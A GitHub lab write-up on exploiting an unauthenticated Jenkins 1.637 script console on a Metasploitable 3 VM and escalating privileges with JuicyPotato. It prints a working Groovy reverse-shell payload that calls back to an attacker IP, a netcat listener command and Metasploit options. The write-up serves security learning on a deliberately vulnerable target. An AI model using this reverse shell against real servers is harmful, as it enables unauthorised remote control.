# Jenkins-Service-Exploit-PrivEsc
I will demonstrate two methods for gaining local service on a vulnerable VM followed by Privilege Escalation to Root

<h2>Intro</h2>

- In my previous lab, exploiting the glassfish service, we achieved local service privileges. Here we will go a step further and privesc to root. I will demonstrate two methods for exploitation on the Metasploitable 3 Windows VM, one using Metasploit and one without. Next we will escalate privileges to root for ultimate control.

<h2>Initial Recon</h2>

- Initial reconnaissance is straight forward. We scan our target where we find various ports and services open for exploitation. You may have to do a bit of deeper reconnaissance by scanning all the ports instead of the default top 1000. One of these services on port 8484 is Jenkins. Doing further enumeration we find the service (Jenkins 1.637, Jetty winstone 2.8) is vulnerable to remote code execution. We also find a console on the ipadress:8484 webpage. No credentials required we have access to the service. 
- Thus, we should all know about proper authentication and authorization as well as to patch and update our services to remove vulnerabilities and ensure proper defense in depth. Luckily for us, our vulnerable target forgot. 

![JenkinsScan](https://user-images.githubusercontent.com/98111674/190929200-25ff1f1b-9b6f-4e72-95d5-903df881ef3f.png)


<h2> Two paths to One goal</h2>

- We can either use Metasploit or do a little digging to find the script console page and proceed directly from the Jenkins Script Console. The choice is yours, the outcome is the same.
- If we do choose to use the script console page we need to manually set up a listener port to connect back to our target. Setup a netcat listener on our attacking VM.
- nc -lnvp #LPort#
- and run the RCE. Otherwise we do this in metasploit. 
![JenkinsConsole](https://user-images.githubusercontent.com/98111674/190929204-6678addc-5ecc-41ec-8ba6-51a6654c7276.png)


<h2> Java RCE </h2>
<br>  String host="10.0.2.4";
<br>  int port=9009;
<br> String cmd="cmd.exe";
<br> Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();

- [Link to where I found the RCE](https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76#file-revsh-groovy)

<h2>Metasploit</h2>

- The options to set in metasploit go as follows: Rhost, Rport, TargetURI, and target Windows. Next we run our exploit and achieve Local Service.
- Note: TargetURI must be changed to match the target url directory. In this case it would be /

![vulnscan2_cmdshell](https://user-images.githubusercontent.com/98111674/190929410-c85909b5-b86f-4be5-a451-6d23652817f1.png)

<h2> PrivEsc </h2>

-We can check for our permissions. We see that SeImpersonatePrivilege is enabled. 
![windowsprivesc_step1](https://user-images.githubusercontent.com/98111674/190929493-95a4490e-21a9-4db2-9751-c6cca3c37a75.png)

- Luckily for us juicypotato will allow us to escalate prvilieges to root. You can look up juicypotato but essentially we need to craft a payload with a COM server, unique CLSID, .exe or .dll, place it in the targets machine, host another netcat listener, then exectute the payload. I will update this later with more detail but here is the result. Root Access!

![windowsprivesc_step2](https://user-images.githubusercontent.com/98111674/190929825-a8699eba-129d-4aa2-96dc-c78a89c43d83.png)

